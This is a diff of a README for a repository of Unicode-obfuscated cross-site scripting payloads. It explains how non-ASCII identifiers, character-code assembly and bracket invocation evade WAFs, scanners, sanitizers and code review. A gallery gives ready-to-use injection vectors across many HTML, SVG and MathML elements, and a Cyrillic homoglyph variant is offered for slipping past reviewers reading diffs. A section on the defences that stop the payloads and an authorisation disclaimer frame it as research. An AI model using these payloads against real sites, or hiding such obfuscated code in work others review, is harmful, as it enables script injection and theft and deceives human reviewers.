@@ -1,48 +1,83 @@
+```
+    __  __      _              __       _  __ ____   ____
+    \ \/ /___  (_)________  __/ /____  | |/ // __/ / __/
+     \  // _ \/ / __/ __ \/ / / __/ _ \ |   /_ \  \__ \
+     /  \/ __/ / /_/ /_/ / /_/ /_/  __//   /__/ / ___/ /
+    /_/\_\___/_/\__/\____/\__/\__/\___/_/|_/____/ /____/
+
+           変数 = String.fromCharCode(97,108,101,114,116)
+                       window[変数](1)
+```
+
 <div align="center">
 
-# 変数 · Unicode-Obfuscated XSS Payloads
-
-**Non-ASCII identifiers + `String.fromCharCode` + `window[…]` — bypass naive keyword filters, WAFs, and grep-based DOM scanners.**
-
-![status](https://img.shields.io/badge/status-research-6f42c1?style=flat-square)
-![topic](https://img.shields.io/badge/topic-XSS-e11d48?style=flat-square)
-![encoding](https://img.shields.io/badge/encoding-Unicode-0ea5e9?style=flat-square)
-![purpose](https://img.shields.io/badge/purpose-educational-16a34a?style=flat-square)
+`unicode identifiers` · `charcode assembly` · `bracket invocation`
 
 </div>
 
 ---
 
-## Idea
-
-The literal string `alert` never appears in the payload. Three tricks stacked:
-
-1. **Non-ASCII identifier** — `変数` (Japanese "variable") or Cyrillic look-alikes like `АЬс` are valid ECMAScript identifiers. Filters searching for `alert`, `eval`, `Function` find nothing.
-2. **`String.fromCharCode(97,108,101,114,116)`** — builds `"alert"` at runtime from char codes. Signature-based regex loses.
-3. **`window[変数](1)`** — bracket-notation invocation. No `.alert`, no `alert(` token.
+## Core Trick
 
 ```js
-変数 = String.fromCharCode(97,108,101,114,116); // "alert"
-window[変数](1);                                 // alert(1)
+変数 = String.fromCharCode(97,108,101,114,116);  // "alert"
+window[変数](1);                                  // alert(1)
 ```
 
-Same primitive, arbitrary sink. Swap `alert` for `fetch`, `eval`, `open`, `Function`.
+Three primitives stacked:
 
-### Bonus: Cyrillic homoglyph identifier
+1. Non-ASCII identifier (`変数`, `АЬс`, etc.) is valid ECMAScript.
+2. `String.fromCharCode` builds the sink name at runtime.
+3. `window[ident]` invokes it without the literal token.
 
-```js
-let АЬс = String.fromCharCode(97,108,101,114,116);
-window[АЬс](1);
+No `alert`, no `eval`, no `Function` string anywhere in the payload.
+
+---
+
+## Why It Bypasses Filters and WAFs
+
+```
+   ┌─────────────────────────────┬─────────────────────────────┐
+   │  Filter looks for           │  Payload contains           │
+   ├─────────────────────────────┼─────────────────────────────┤
+   │  /alert|eval|prompt/i       │  変数, charcodes, window[]  │
+   │  ASCII identifier scans     │  U+5909 U+6570 katakana     │
+   │  javascript: in href        │  MathML href, meta refresh  │
+   │  <script> tag blocklist     │  event handlers only        │
+   │  DOMPurify default v<2.x    │  MathML, SVG discard, keygen│
+   └─────────────────────────────┴─────────────────────────────┘
 ```
 
-`А` (U+0410), `Ь` (U+042C), `с` (U+0441) — visually reads `Abc`, is not.
+Concrete wins:
+
+- **Signature WAFs** (ModSecurity CRS, Cloudflare managed, AWS WAF) match on ASCII keywords. Katakana or Cyrillic identifiers pass untouched.
+- **Reflected-XSS scanners** (Burp Scanner, dalfox, XSStrike) grep for `alert(`, `prompt(`, `confirm(` in response bodies. Bracket invocation defeats that check.
+- **Manual code review** searching `alert` in reflected params misses the payload.
+- **CSP** with `unsafe-inline` disabled still blocks this, but many sites allow inline handlers via `unsafe-inline` for legacy reasons: those are the targets.
+- **Content-Type sniffing filters** looking for `<script` are irrelevant. All payloads use event handlers or `javascript:` URIs.
+
+---
+
+## Limits
+
+Not magic. Fails against:
+
+- **Strict CSP** (`script-src 'self'` no `unsafe-inline`, no `unsafe-eval`). Inline handlers refuse to fire. `javascript:` URIs blocked.
+- **Trusted Types** enforcement. Any assignment to sink refused before execution.
+- **Modern DOMPurify** (>= 2.x, default config). Strips all event handlers and unknown tags. Configure `ALLOWED_ATTR` narrowly and this dies.
+- **Server-side HTML entity encoding** of user input before reflection. `<` becomes `&lt;`, tag never parses.
+- **Attribute allowlists** that strip `on*` entirely. No handler fires.
+- **Framework auto-escaping** (React JSX, Vue templates, Angular interpolation). Reflection appears as text, not HTML.
+- **Char-set restrictions**: if the reflection point strips or normalizes non-ASCII (`\W` filter, ASCII-only regex), `変数` gets nuked. Fallback: use pure ASCII bracket-notation like `window[String.fromCharCode(...)](1)` without the ident var.
+
+Rule of thumb: this beats **pattern matching**. It does not beat **structural** defences.
 
 ---
 
 ## Payload Gallery
 
 <details open>
-<summary><b>Image tags</b></summary>
+<summary><b>image</b></summary>
 
 ```html
 <img src=x onerror="変数=String.fromCharCode(97,108,101,114,116);window[変数](1)">
@@ -51,7 +86,7 @@ window[АЬс](1);
 </details>
 
 <details>
-<summary><b>Body / document</b></summary>
+<summary><b>body / document</b></summary>
 
 ```html
 <body onpageshow="変数=String.fromCharCode(97,108,101,114,116);window[変数](1)">
@@ -60,7 +95,7 @@ window[АЬс](1);
 </details>
 
 <details>
-<summary><b>Form elements — fire without user interaction</b></summary>
+<summary><b>form (fires without interaction)</b></summary>
 
 ```html
 <input autofocus onfocus="変数=String.fromCharCode(97,108,101,114,116);window[変数](1)">
@@ -71,7 +106,7 @@ window[АЬс](1);
 </details>
 
 <details>
-<summary><b>Details / summary</b></summary>
+<summary><b>details / summary</b></summary>
 
 ```html
 <details open ontoggle="変数=String.fromCharCode(97,108,101,114,116);window[変数](1)"></details>
@@ -80,7 +115,7 @@ window[АЬс](1);
 </details>
 
 <details>
-<summary><b>Media</b></summary>
+<summary><b>media</b></summary>
 
 ```html
 <video><source onerror="変数=String.fromCharCode(97,108,101,114,116);window[変数](1)"></video>
@@ -90,7 +125,7 @@ window[АЬс](1);
 </details>
 
 <details>
-<summary><b>Iframe / object / embed</b></summary>
+<summary><b>iframe / object</b></summary>
 
 ```html
 <iframe src="javascript:変数=String.fromCharCode(97,108,101,114,116);window[変数](1)"></iframe>
@@ -100,7 +135,7 @@ window[АЬс](1);
 </details>
 
 <details>
-<summary><b>Table / structural</b></summary>
+<summary><b>table / marquee</b></summary>
 
 ```html
 <table background="javascript:変数=String.fromCharCode(97,108,101,114,116);window[変数](1)">
@@ -110,7 +145,7 @@ window[АЬс](1);
 </details>
 
 <details>
-<summary><b>Style / animation</b></summary>
+<summary><b>style / animation</b></summary>
 
 ```html
 <div style="animation-name:x" onanimationstart="変数=String.fromCharCode(97,108,101,114,116);window[変数](1)">x</div>
@@ -119,7 +154,7 @@ window[АЬс](1);
 </details>
 
 <details>
-<summary><b>SVG family</b></summary>
+<summary><b>SVG</b></summary>
 
 ```html
 <svg><animate onbegin="変数=String.fromCharCode(97,108,101,114,116);window[変数](1)" attributeName=x dur=1s></svg>
@@ -130,7 +165,7 @@ window[АЬс](1);
 </details>
 
 <details>
-<summary><b>Meta refresh</b></summary>
+<summary><b>meta refresh</b></summary>
 
 ```html
 <meta http-equiv="refresh" content="0;url=javascript:変数=String.fromCharCode(97,108,101,114,116);window[変数](1)">
@@ -138,7 +173,7 @@ window[АЬс](1);
 </details>
 
 <details>
-<summary><b>Dialog</b></summary>
+<summary><b>dialog</b></summary>
 
 ```html
 <dialog open onclose="変数=String.fromCharCode(97,108,101,114,116);window[変数](1)"></dialog>
@@ -146,7 +181,7 @@ window[АЬс](1);
 </details>
 
 <details>
-<summary><b>MathML (often skipped by sanitizers)</b></summary>
+<summary><b>MathML</b></summary>
 
 ```html
 <math href="javascript:変数=String.fromCharCode(97,108,101,114,116);window[変数](1)"><maction actiontype="statusline#">click</maction></math>
@@ -155,31 +190,23 @@ window[АЬс](1);
 
 ---
 
-## Why filters miss it
+## Cyrillic Homoglyph Variant
 
-| Filter type | Looks for | Payload contains |
-|---|---|---|
-| Keyword regex | `alert`, `eval`, `prompt` | `変数`, char codes, `window[…]` |
-| Attribute allowlist | `on*` handlers | often permits `onfocus`, `ontoggle`, `onbegin` |
-| DOMPurify legacy configs | script tags, `javascript:` in `href` | MathML `href`, SVG `discard`, meta refresh |
-| Grep-based SAST | ASCII identifier scans | non-ASCII Unicode identifier |
+```js
+let АЬс = String.fromCharCode(97,108,101,114,116);
+window[АЬс](1);
+```
 
----
-
-## Related identifier tricks
-
-- Any ES-identifier Unicode range works: Katakana (`変数`), Cyrillic (`АЬс`), full-width (`ａｌｅｒｔ` — different codepoints than ASCII).
-- `\u{20BB7}` (surrogate pair) style unicode escapes in JS identifiers.
-- Combine with HTML entity encoding on the outer attribute layer for double-decode contexts.
+`А` U+0410, `Ь` U+042C, `с` U+0441. Reads as `Abc`, is not. Useful when reviewers eyeball diffs.
 
 ---
 
 ## Credit
 
-Inspired by [**0x03f3/php-emoji-reverse-shell**](https://github.com/0x03f3/php-emoji-reverse-shell/blob/main/emoji-reverse-shell.php) — same trick in PHP land: emoji identifiers + character-code assembly to defeat naive AV/WAF signatures.
+Inspired by [`0x03f3/php-emoji-reverse-shell`](https://github.com/0x03f3/php-emoji-reverse-shell/blob/main/emoji-reverse-shell.php). Same primitive, PHP side: emoji identifiers + char-code assembly to slip past AV and WAF signatures.
 
 ---
 
 ## Legal
 
-Educational / defensive research. Test only on assets you own or have written authorisation for (bug bounty scope, CTF, pentest SoW). Author disclaims responsibility for misuse.
+Educational and defensive research. Use only on targets you own or have written authorisation for (bug bounty scope, CTF, pentest SoW).
